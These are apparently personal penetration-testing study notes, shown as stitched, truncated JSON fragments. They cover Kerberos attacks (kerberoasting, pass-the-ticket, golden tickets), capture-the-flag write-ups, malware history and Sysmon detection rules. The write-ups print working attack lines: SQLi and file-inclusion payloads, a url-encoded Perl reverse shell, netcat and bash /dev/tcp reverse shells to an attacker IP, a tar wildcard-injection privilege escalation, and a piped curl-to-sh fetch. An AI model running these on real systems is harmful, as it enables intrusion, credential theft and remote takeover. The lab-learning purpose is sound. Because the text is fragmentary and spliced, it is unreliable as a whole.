    "content": "\n## What is Kerberos ?\n- Kerberos is the default authentication service for Microsoft Windows domains\\\n- an authentication protocol, not authorization. It allows identification 4 each user, but doesn't validate to which reources/services can the user access\n- intented to be more secure than NTLM ¬†by using third party ticket authorization as well as stronger encryption\n- several **agents** work together to provide authentication in Kerberos:\n\t- Client/User who wants to access the service\n\t- Application Server *(AP)* which offers the service required by the user\n\t- Key Distribution Center *(KDC)*: the main service, responsible of issuing the tickets, installed on the [AD -- Domain Controllers (DC)](../../sheets/AD -- Domain Controllers (DC).md) \u0026 supported by the Authentication Service *(AS)*, which issues TGTs\n\n### Tickets\nThe main structures handled by Kerberos. They're delivered to the users in order to be used by them to perform several actions.\n\n- **Ticket Granting Service (TGS)**: users can use to authenticate against a service. It is encrypted with the service key\n\t- ![[write-ups/images/Pasted image 20220619113227.png]]\n- **Ticket Granting Ticket (TGT)**: presented to the KDC to request for TGSs. It is encrypted with the KDC key\n\t- ![[write-ups/images/Pasted image 20220619113222.png]]\n\n### Privilege Attribute Certificate *(PAC)*\nIt's a structure included in almost every ticket. This structure contains the privileges of the user and it is signed with the KDC key.\n\nPAC verification consists of checking only its signature, without inspecting if privileges inside of PAC are correct. Furthermore, a client can avoid the inclusion of the PAC inside the ticket by specifying it in `KERB-PA-PAC-REQUEST` field of ticket request\n\n### Types of mesages\nKerberos uses differents kinds of messages. The most interesting are the following:\n\n|                 |                                                                 |\n| --------------- | --------------------------------------------------------------- |\n| **KRB_AS_REQ**  | used to request the TGT to KDC                                  |\n| **KRB_AS_REP**  | used to deliver the TGT by KDC                                  |\n| **KRB_TGS_REQ** | used to request the TGS to KDC, using the TGT                   |\n| **KRB_TGS_REP** | used to deliver the TGS by KDCM                                 |\n| **KRB_AP_REQ**  | used to authenticate a user against a service, using the TGS    |\n| **KRB_AP_REP**  | (optional) used by servicee to identify itself against the user |\n| **KPB_ERROR**   | msg to communicate error conditions                             | \n\n\u003e **NOTE**: Additionally, even if it is not part of Kerberos, but NRPC, the **AP** optionally could use the `KERB_VERIFY_PAC_REQUEST` message to send to **KDC** the signature of **PAC**, and verify if it is correc\n\nSummary of msgs sequency to perform auth:\n![[write-ups/images/Pasted image 20220619113911.png]]\n\n### Kerberos Authentication Overview\n![[write-ups/images/Pasted image 20220619072424.png]]\n1. client requests an Authentication Ticket or Ticket Granting Ticket (TGT)\n2. Key Distribution Center verifies the client and sends back an encrypted TGT\n3. client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access\n4. KDC verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client\n5. client requests the service and sends the valid session key to prove the user has access\n6. the service grants access\n\n### Attack Privilege Requirement\n|                      |                                         |\n| -------------------- | --------------------------------------- |\n| Kerbrute Enumeration | no domain access required               |\n| Pass the Ticket      | access as a user to the domain required |\n| Kerberoasting        | access as any user required             |\n| AS-REP Roasting      | access as any user required             |\n| Golden Ticket        | full domain compromise *(domain admin)* |\n| Silver Ticket        | service hash required                   |\n| Skeleton Key         | full domain compromise *(domain admin)* | \n\n## Abusing Pre-Auth\n- by brute-forcing in pre-auth we don't trigger the account failed to log an event which can throw up red flags to the blue team\n- we can brute-force by only sending a single¬†UDP¬†frame to the KDC allowing you to enumerate the users on the domain from a wordlist\n- using [kerbrute]([https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)):\n\t- ![[write-ups/images/Pasted image 20220619120038.png]]\n\n## Harvesting \u0026 Brute-Forcing Tickets\n- harvesting tickets uing [Rubeus](https://github.com/GhostPack/Rubeus): `Rubeus.exe harvest /interval:30`\n\t- ![[write-ups/images/Pasted image 20220619120554.png]]\n- add the domain controller domain name to the windows host file: `echo 10.10.72.127 CONTROLLER.local \u003e\u003e C:\\Windows\\System32\\drivers\\etc\\hosts`\n- *\"spray\"* against all found user accounts in the domain to find which one may have that password: `Rubeus.exe brute /password:Password1 /noticket`\n\t- ![[write-ups/images/Pasted image 20220619122207.png]]\n\n\u003e **NOTE**: be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies\n\n## Kerberoasting\n- with `rubues`: `Rubeus.exe kerberoast`\n- with [impacket](): `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.72.127 -request`\n\t- ![[write-ups/images/Pasted image 20220619122329.png]]\n- and crack the hash: `hashcat -m 13100 -a 0 hash.txt Pass.txt`\n\t- ![[write-ups/images/Pasted image 20220619122724.png]]\n\n### What Can a Service Account do?\n- once you havee a service account there's various ways to further exfiltrate data or collecting loot depending on whether the service is a domain admin or not\n- if a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit\n- if not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts\n\n\n\n### Mitigations\n**Strong Service Passwords**: if the service account passwords are strong then kerberoasting will be ineffective\n\n**Don't Make Service Accounts Domain Admins**: service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.\n\n## AS-REP Roasting\nSimilar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled\n- During pre-auth the user's hash will be used to encrypt a timestamp that the DC will attempt to decrypt in order to validate that the right hash is being used and is not replaying a previous request\n- After validation, the KDC will then issue a TGT for the user\n- If pre-auth is disabled we can **request any authentication data for any user and the KDC will return an encrypted TGT** *(which can further be cracked offline)*\n\n![[write-ups/images/Pasted image 20220619123731.png]]\n\nIf we crack the hashes: `hashcat -m 18200 AS-REP Pass.txt` we get: `admin2:P@$$W0rd2, user3:Password3`\n![[write-ups/images/Pasted image 20220619123955.png]]\n\n### Mitigation\n**Have a strong password policy**. With a strong password, the hashes will take longer to crack making this attack less effective\n\n**Don't turn off Kerberos Pre-Authentication unless it's necessary** there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.\n\n## Pass the Ticket\nPass the ticket works by dumping the TGT from the LSASS memory of the machine. The [lsass.exe (Local Security Authority Subsystem Service)](../../sheets/lsass.exe (Local Security Authority Subsystem Service).md) stores credentials for the AD server \u0026 Kerberos tickets along w other creds in memory\n\nA known tool exactly for that is [mimikatz](). This will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.\n\nYou can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.\n\n![[write-ups/images/Pasted image 20220619124706.png]]\n\n- dump all `.kirbi` tickets in the curr dir w `mimikatz`:\n\t- ![[write-ups/images/Pasted image 20220619125509.png]]\n- pass the ticket \u0026 impersonate\n\t- find someone valuable to impersonate, in our case `Administrator`\n\t- ![[write-ups/images/Pasted image 20220619125719.png]]\n\t- verifying that we successfully impersonated the ticket by listing our cached tickets: `klist`\n\t- ![[write-ups/images/Pasted image 20220619125416.png]]\n\n\u003e **NOTE**: this is only a POC to understand how to pass the ticket and gain domain admin, so don't take this as a definitive guide of how to run this attack, since the approach might change based on the environment\n\n### Mitigation\n**Don't let your domain admins log onto anything except the domain controller**: this is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.\n\n## Golden / Silver Ticket Attacks\n- a silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet\n\t- silver ticket: limited to the service that is targeted\n\t- golden ticket: has access to any Kerberos service\n- **use-scenario**: you want to access the domain's SQL server, but the curr compromised user doesn't have access\n\t- find an accessible service account to get a foothold with by kerberoasting\n\t- then dump the service hash\n\t- and finally impersonate their TGT in order to request a service ticket for the SQL service\n\n### What's the difference between a KRBTGT and a TGT ?\n- a KRBTGT is the service account for the KDC, which issues all of the tickets to the clients\n- by impersonating this acc \u0026 creating a golden ticket you give yourself the ability to create a service ticket for anything you want\n\n### Hands-On\n- dump the hash as well as the security identifier needed to create a Golden Ticket *(to create a silver ticket change `/name:` to dump the hash of either a domain admin / service acc you're interested in)*\n\t- ![[write-ups/images/Pasted image 20220619131924.png]]\n- create a golden/silver ticket: `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` *(4 silver ticket ¬†simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103)*\n\t- ![[write-ups/images/Pasted image 20220619132541.png]]\n- use the golden/silver ticket to access other machines: `misc::cmd` which will open a new elevated cmd with the given ticket\n\n## Kerberos Backdoors\nUnlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password\n\nIt works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.\n\nThe DC then tries to decrypt the timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the¬†skeleton key NT hash allowing you access to the domain forest\n\n\u003e **NOTE**: the skeleton key will not persist by itself because it runs in the memory\n\n---\n\n## References\n- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)[](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)\n- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)[](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)\n- [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)[](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)\n- [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)[](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)\n- [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)[](https://www.varonis.com/blog/kerberos-authentication-explained/)\n- [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)[](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)\n- [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)[](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)\n- [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)\n\n## See Also\n- [[write-ups/THM]]\n",

So I went to the web server\n\n## Getting user with sqli\n![[write-ups/images/Pasted image 20220821112636.png]]\nLooks like of those hitman websites on Tor üò∂‚Äçüå´Ô∏è. Besides some login \u0026 search functionality it doesn't seem we have much to work with here. Gobuster found `/images` \u0026 `/server-status`, but the latter one just gave us a [403 forbidden access](). Now I could've started to look for a bypass, but decided to play with the login @ first for a bit since it was more spicy.\n\nBy supplying a basic payload in the username field: `' or 1=1-- -` we're redirected to `/portal.php`. Good we have [[sqli]]\n![[write-ups/images/Pasted image 20220821113342.png]]\nHere we can search for game reviews, since the login was vulnerable maybe this is too üòã\n![[write-ups/images/Pasted image 20220821113843.png]]\nWell... something happened. I guess based on the error thrown that we need a double qoute instead of a single one\n![[write-ups/images/Pasted image 20220821114234.png]]\nBut I got nothing... Thus I went to a more reliable friend [sqlmap](). I saved the `POST` request to `portal.php` into a file from Burp *(`right-click -\u003e Copy to file`)* \u0026 ran \n```bash\nsqlmap -r `pwd`/portalReq.txt --dbms=mysql --dump\n# OR without the request file\nsqlmap -u \"http://10.10.66.82/portal.php\" --data \"searchitem=test\" -p \"searchitem\" --method POST\n```\nWhich got me this\n![[write-ups/images/Pasted image 20220821115407.png]]\n\nSupplying the hash to [crackstation](https://crackstation.net/) has done the job for me\n![[write-ups/images/Pasted image 20220821115524.png]]\n\nWhat remains is to ssh... and we're in\n![[write-ups/images/Pasted image 20220821115630.png]]\n\n\n## Privesc\nFirst things first I ran [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) in memory: `curl http://10.18.12.227:8001/linpeas.sh | sh`\n- based on the old version of `sudo` I thought I might find some public exploit \u0026 I did, even multiple ones. Tried [pwfeedback Buffer Overflow](https://www.exploit-db.com/exploits/48052) and a [# Heap-Based Buffer Overflow Privilege Escalation](https://www.exploit-db.com/exploits/49521) but without success\n- we see some new active ports on `10000` and `3306`, for the moment I just took a mind-note about it\n\t- ![[write-ups/images/Pasted image 20220821122143.png]]\n- it permits root login on `ssh`\n- tried to abuse [SUID files]() on `at` \u0026 `pkexec` but failed\nIn the end I went back to the new exposed services. But how can I see what are they serving. [[SSH Tunneling]] is here for rescue ü¶∏. We can tunnel both services through `ssh` to reach them from our localhost like this:\n```bash\nssh -L 10000:localhost:10000 agent47@10.10.66.82\nssh -L 3306:localhost:3306 agent47@10.10.66.82\n```\nOnce we go to `http://localhost:10000/` we see [Webmin](https://webmin.com/) running: *\"web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more\"*\n![[write-ups/images/Pasted image 20220821123827.png]]\n\nI tried to login as `agent47` with our known password \u0026 it just worked\n![[write-ups/images/Pasted image 20220821123912.png]]\n\n\nIf we look @ the source we can find the version\n![[write-ups/images/Pasted image 20220821124254.png]]\n\nFinding around the interwebs I found this [RCE through /file/show.cgi](https://www.exploit-db.com/exploits/21851). So let's take a look at the metasploit module because we want to do things manually right ü´†?\n- first it attempts to login with the supplied credentials\n\t- ![[write-ups/images/Pasted image 20220821132200.png]]\n- then it sends a `GET` request @ `/file/show.cgi/bin/\u003crandom_char\u003e|#\u003ccmd\u003e|` \u0026 sets the cookie\n\t- ![[write-ups/images/Pasted image 20220821132347.png]]\n- since we're already logged in let's see if we can get a `ping` back with the following payload: `http://localhost:10000/file/show.cgi/show.cgi/bin/A/%7Cping -c 3 10.18.12.227%7C` *(i just added `A` as the random char \u0026 added my cmd: `ping -c 3 \u003cip\u003e`, then url-encode)*\n\t- ![[write-ups/images/Pasted image 20220821132536.png]]\n- and we got it ü•≥ so let's spawn a shell. I tried all different kind of reverse shells until whaat worked for me was the [Perl one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#perl) url-encoded with [this website](https://www.urlencoder.io/)\n\t- `http://localhost:10000/file/show.cgi/show.cgi/bin/A/%7Cperl -e %27use Socket%3B%24i%3D%2210.18.12.227%22%3B%24p%3D1337%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash -i%22%29%3B%7D%3B%27%7C`\n\t- ![[write-ups/images/Pasted image 20220821133831.png]]\n\n\n## Refs\n\n## See Also\n- [[write-ups/THM]]",

Whilst the user played the \"fun\" game, another program, or subroutine, called \"PERVADE\" would create a copy of itself and¬†_ANIMAL_¬†in every directory that the user has access toA *(more about it [here](https://www.fourmilab.ch/documents/univac/animal.html))*\n- **Elk Cloner**: one of the first¬†_microcomputer viruses_ *(1982)*¬†that spread outside of a computer system or laboratory *(i.e in the wild)*\n\t- written by a 15 year-old _high school student_¬†known for his pranks and practical jokes\n\t- used a technique now called¬†_\"boot sector virus\"_\n\t- The program was placed into a game's code until an unsuspecting victim started the game for the 50th time. Instead of lunching the game it would display the following poem:\n\t\t```\n\t\tElk Cloner: The program with a personality  \n\t\tit will get on all your disks  \n\t\tit will infiltrate your chips  \n\t\tYes, it's Cloner!  \n\t\tIt will stick to you like glue  \n\t\tIt will modify RAM too  \n\t\tSend in the Cloner!  \n\t\t```\n\t- If the computer booted from an¬†_infected_¬†floppy disk, a copy of the virus was placed in the computer's memory, this then spread to¬†_uninfected_¬†discs that were inserted into infected computers. Elk Cloner also wrote a¬†_signature byte_¬†to the disk's directory, indicating that it had already been infected\n\t- **Boot Sector Viruses**:¬†are less common in modern technology, but still are relevant and important to know about. They usually infect the boot sector (the part which starts the computer) and once infected, they will try to infect every disc inserted into the infected computer but can be removed. The computer does¬†not¬†have to successfully boot in order for the computer to become infected. (you will only see this with floppy discs)\n- **The Morris Internet Worm**: released in¬†**1988**,¬†**Robert Tappan Morris**¬†created a worm that was supposed to highlight security flaws of the academic networks that it travelled to\n\t- only downfall of the worm was that it failed to check which computers it had already been to, thus infecting many computers multiple times and causing a DoS attack\n\t- Morris was the first person to be arrested from a felony conviction in the US under the 1986 [Computer Fraud and Abuse act](https://en.wikipedia.org/wiki/Data_Protection_Act_2018)\n\t- the worm spread simply by exploiting known vulnerabilities in Unix Sendmail, rsh (remote shell)/[rexec](https://en.wikipedia.org/wiki/Berkeley_r-commands)¬†and weak passwords\n\t- it infected 2000 computers in 15h \u0026 it often took 2 days to get it off a computer, rendering it useless. 6000¬† computers were infected in the end and this was around 10% of the internet at the time\n\t- although it caused a lot of damage it raised awareness of the dangers of weak passwords\n- **Cascade**: DOS malware, notably the first type to use a form of encryption to keep the program undetected\n\t- in the 80s, specifically on the¬†**Digital Equipment**¬†*(a large computer company)*¬†operating systems,¬†a common file extension for executables was `.COM` *(similar to how a batch file/`.sh` file would work now)* which allowed text files containing commands to be executable\n\t- the virus would only work by executing the infected file. Each time the infected file was run, it would slowly make changes to the computer\n\t- the virus would try not to infect¬†[IBM Computers](https://www.ibm.com/uk-en)¬†by looking for text containing a copyright statement. However, this failed due to a bug which allowed it to infect all computers\n\t- was truly a big virus, some accounts claiming there were 40 different variants\n\t- [cascade malware in action](https://www.youtube.com/watch?v=z7g-v3d7-Gk)\n\n---\n\n## References\n- [Malware Wiki](https://malwiki.org/index.php?title=Main_Page)\n\n## See Also\n- [[write-ups/THM]]\n",

    "title": "Malware Intro",
    "content": "\nWhen analysing malware it's important to consider the following:\n- Point of Entry *(PoE)*: how did the malware ended up on your network *(i.e through spam that our e-mail filtering missed \u0026 user opened an attachment? =\u003e review spam filters \u0026 train user better for future prevention)*\n- What are the indicators that malware has even been executed on a machine? *(e.g files, procs, attempt of \"un-ordinary\" comms)*\n- How does the malware perform? Does it attempt to infect other devices? Or encrypt files / install a backdoor/RAT\n- How can we ultimately prevent and/or detect further infection?!\n\n## Malware Campaigns\nAttacks can generally be classified into two types\n1. **Targeted**: malware attacks created for a specific purpose against a specific target *(e.g [DarkHotel](https://www.kaspersky.co.uk/resource-center/threats/darkhotel-malware-virus-threat-definition) malware - designed to steal information such as authentication details from government officials)*\n2. **Mass Campaign**: most common type of attacks, with the sole purpose of infecting as many devices as possible \u0026 perform whatever it may *(regardless of the target)*\n\t- companies such as [Kaspersky]() track these campaigns *(known as Advanced Persistent Threats - APTs)* \u0026 often report their infection rate/indicators of compromise *(IOCs)*\n\t- e.g [Crouching Yeti](https://www.kaspersky.co.uk/resource-center/threats/crouching-yeti-energetic-bear-malware-threat) campaign which targeted multiple industries *(e.g industrial, pharma, manufacturing, education, construction)*\n\n## Identifying Malware\n\nThe process of a malware attack can be broken down into a few broad steps:\n- **Delivery**: USB, PDF attachmnts through phishing campaigns, vulnerability enumeration\n- **Execution**: what does the malware actually do? *(encrypts files? =\u003e ransomware, records info such as keystrokes, video, audio =\u003e spyware, etc)*\n- **Persistence**: it wouldn't make sense for malware developers to spend so many resources just for it to execute once and that's it... gone =\u003e so persistance mechanisms are usually employed to maintain access to a compromised computer\n- **Propagation**: if it can infect 1 device, why not infect multiple *(maybe even create a botnet)*. Host discovery usually generates a lot of traffic\n\nThere are 2 main categories of fingerprints that malware might leave on a host after infection:\n1. **Host-Based Signatures**: the results of execution and any persistence *(e.g file encrypted? any additional software installed)*\n2. **Network-Based Signatures**: are the observation of any networking communication taking place during delivery, execution and propagation *(e.g ransomware: any payments commited to BTC addrs)*\n\n## Static VS Dynamic Analysis\n- **Static Analysis**: is used to gain a high-level abstraction of the sample. At its core, this method is of the analysis of the sample at the state it presents itself as, without executing the code\n- **Dynamic Analysis**: involves executing the sample and observing what happens. Usually done in a VM\n\n\n---\n\n## References\n\n## See Also\n- [[private/history-of-malware]]\n- [[write-ups/THM]]",

I ran `gobuster` in the background \u0026 decided to check out `robots.txt`, which revealed 2 files\n\n![[write-ups/images/Pasted image 20220823160356.png]]\n\nThere's our first flag + a potential wordlist for brute-forcing somebody's password.\n\nGoing back to `gobuster` we got quite some hits:\n![[write-ups/images/Pasted image 20220823160635.png]]\n\n## From wordpress credentials to RCE\nSeems that it runs WordPress =\u003e ran `wpscan` in the background. While that ran I wanted to check if I could use `xmlrpc.php` to [[|brute-force credentials]] =\u003e send this req with Burp\n![[write-ups/images/Pasted image 20220823161415.png]]\nNow I was looking for any of the following methods in the response: `wp.getUserBlogs`, `wp.getCategories` or `metaWeblog.getUsersBlogs`. A faster way to brute-force credentials is using `system.multicall` as we can try several credentials on the same request *(if confused, see [Attacking Wordpress](Attacking Wordpress))*\n\nSo yeah we could make `wpscan` do the work for us \u0026 run a brute-force attack *(since the theme is mr robot I figured the name should be elliot)*: `wpscan -P fsocity.dic -U elliot --password-attack xmlrpc-multicall --url http://10.10.13.131/`\n\nI still haven't look at all the results from `gobuster`, so I tinkered through them \u0026 found a peculiar endpoint: `/license`:\n```\nwhat you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?\n.... \u003c some random data\u003e ....\ndo you want a password or something?\n.... \u003c more random data\u003e ....\nZWxsaW90OkVSMjgtMDY1Mgo=\n```\nOk.. let's try base64 decode this?\n\n![[write-ups/images/Pasted image 20220823162623.png]]\n\nAnd we got the user \u0026 password üòÜ without brute-forcing. However, we could have a look and see if the pass was in our dictionary: `cat fsocity.dic| grep ER28-0` which it is, so the attack would be successfull.\n\nNow that we're in the WordPress dashboard we can go to `Appearance -\u003e Editor -\u003e 404 Template` \u0026 replace it with a [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Then save \u0026 navigate to a random nonexistent page to trigger our payload\n![[write-ups/images/Pasted image 20220823163301.png]]\n\nNow that we got a shell, let's do some basic enumeration.\n\n![[write-ups/images/Pasted image 20220823163814.png]]\n\nWe can't read the 2nd flag since we're not the `robot` user, but we have it's md5 password hash. Plugging it in [crackstation](https://crackstation.net/) reveals it: `abcdefghijklmnopqrstuvwxyz`. Consequently, we can now switch to the `robot` user: \n```bash\nsu robot\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.18.12.227 1337 \u003e/tmp/f\n```\n\n## Classic SUID privesc\nLooking @ the suid files:\n\n![[write-ups/images/Pasted image 20220823164832.png]]\n\nWe find [nmap](https://gtfobins.github.io/gtfobins/nmap/) which can be started in `--interactive` mode \u0026 be used to exeecute shell commands:\n![[write-ups/images/Pasted image 20220823165000.png]]\n\n\n## Refs\n- [WordPress Haktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)\n\n## See Also\n- [[Attacking Wordpress]]\n- [[write-ups/THM]]",

Going back to gobuster revealed `/administrator` which runs [cuppa CMS](https://www.cuppacms.com/)\n![[write-ups/images/Pasted image 20220822153616.png]]\nTried to login as `milesdyson` hoping to have some kind of credential reuse \u0026 also the defaults, but nothing. At this point I went to my old friend google \u0026 found a [file inclusion](https://www.exploit-db.com/exploits/25971). To try it I went to the following URL: `http://10.10.94.44/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`\n![[write-ups/images/Pasted image 20220822153840.png]]\nAs the exploit note says, we can access `Configuration.php` \u0026 leak the password by supplying this payload:`urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`. It will get us the contents of the configuration file in base64, so decode it and voila:\n![[write-ups/images/Pasted image 20220822154222.png]]\nOr we can do more nasty stuff such as executing php code \u0026 getting a [reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)\n![[write-ups/images/Pasted image 20220822160118.png]]\n\n## Cron with wildcard injection privesc\nOnce I got onto the system I ran the [pwncat's enumeration module](https://pwncat.readthedocs.io/en/latest/enum.html) \u0026 linpeas: `curl http://10.18.12.227:8000/linepas.sh | sh` . While taking my time going through anything peculiar I noticed a `backup.sh` in `milesdyson` home dir which is owned by `root`\n![[write-ups/images/Pasted image 20220822161050.png]]\n\nAs it turns out, the backup acts a cron job that runs [once every minute](https://crontab.guru/#*/1_*_*_*_*)\n![[write-ups/images/Pasted image 20220822160816.png]]\n\nTaking a look again at the `backup.sh` script I noticed it ran `tar` with a general wildcard `*` and not `/path/*` or `./*`. Thus we can do unexpected things, such as privesc, through [[Wildcard Injection]]. If confused about the topic take a look at [this paper](https://www.exploit-db.com/papers/33930) going in depth. The basic idea is that we can inject arbitrary arguments to shell commands by creating specially crafted filenames.\n\nIn our case we have to look @ [tar](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar) \u0026 identify args that can be used for poisoning: `--checkpoint` and `--checkpoint-action` are our cadidates:\n![[write-ups/images/Pasted image 20220822170616.png]]\n\nGoing forward we need to create 2 files: `--checkpoint=1` and `--checkpoint-action=exec=sh privesc.sh`, placing them in `/var/www/html` *(since that's where `tar` gets executed)*. Doing that, tar will get confused \u0026 treat our files as arguments that instruct it to execute our `privesc.sh` script as `root`.\n```bash\necho 'bash -i \u003e\u0026 /dev/tcp/10.18.12.227/1337 0\u003e\u00261' \u003e privesc.sh \u0026\u0026 touch \"/var/www/html/--checkpoint=1\" \"/var/www/html/--checkpoint-action=exec=sh privesc.sh\"\n```\n\nNow we just need to wait 1 minute to get our root shell ‚òï\n![[write-ups/images/Pasted image 20220822165638.png]]\n\n\n## See Also\n- [[Wildcard Injection]]\n- [[write-ups/THM]]\n",

events for analysis\n\t- most common way to deal with these events is to exclude all trusted domains that you know will be very common \"noise\" in your environment\n\t- once you get rid of the noise you can then look for DNS anomalies\n\t\t```xml\n\t\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\t\u003cDnsQuery onmatch=\"exclude\"\u003e  \n\t\t\t  \u003cQueryName condition=\"end

the noise\n- **Exclude \u003e Include**: it's typically best to prioritize excluding events rather than including events. This prevents you from accidentally missing crucial events and only seeing the events that matter the most\n- **Use the CLI**: gives you the most control and filtering allowing for further granular control. You can use either `Get-WinEvent` or `wevutil.exe` to access \u0026 filter logs *(see [Windows Event Logs](Windows Event Logs.md))*\n- **Know your env before implementation**: should have a firm understanding of the network or environment you are working within to fully understand what is normal and what is suspicious in order to effectively craft your rules\n### Answers\n- How many event ID 3 events are in `C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx`?\n\t```powershell\n\tGet-WinEvent -Path .\\Filtering.evtx -FilterXPath '*/System/EventID=3' | Measure-Object\n\t\n\tCount    : 73591\n\t```\n- What is the UTC time created of the first network event in¬†`C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx`?: `2021-01-06 01:35:50.464`\n\t- in [Event Viewer](): `Filter Current Log \u003e EventID 3 \u003e Sort by date \u0026 time`\n\n## Hunting Metasploit\n\n- how malware and payloads interact with the network check out the¬†[Malware Common Ports Spreadsheet](https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo)\n- detect the creation of new network connections: use `EventId=3` \u0026 active connections on `4444` \u0026 `5555`\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cNetworkConnect onmatch=\"include\"\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e4444\u003c/DestinationPort\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e5555\u003c/DestinationPort\u003e  \n\t\t\u003c/NetworkConnect\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n- Using Powershell's [Get-WinEvent]()\n\t```powershell\n\tGet-WinEvent -Path .\\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=4444'\n\t```\n\t\n## Detecting [Mimikatz](https://github.com/ParrotSec/mimikatz)\n\n- looking for files created with the name Mimikatz: simple way to detect activity that has bypassed anti-virus or other detection measures\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cFileCreate onmatch=\"include\"\u003e  \n\t\t\t\u003cTargetFileName condition=\"contains\"\u003emimikatz\u003c/TargetFileName\u003e  \n\t\t\u003c/FileCreate\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n\u003e **NOTE:** when dealing with an advanced threat you will need more advanced hunting techniques like searching for LSASS behavior but this technique can still be useful\n\n- abnormal `LSASS` behavior\n\t- can use the¬†`ProcessAccess`¬†event ID\n\t- show potential LSASS abuse which usually connects back to Mimikatz some other kind of credential dumping tool\n\t- if LSASS is accessed by a process other than¬†`svchost.exe`¬†it should be considered suspicious\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  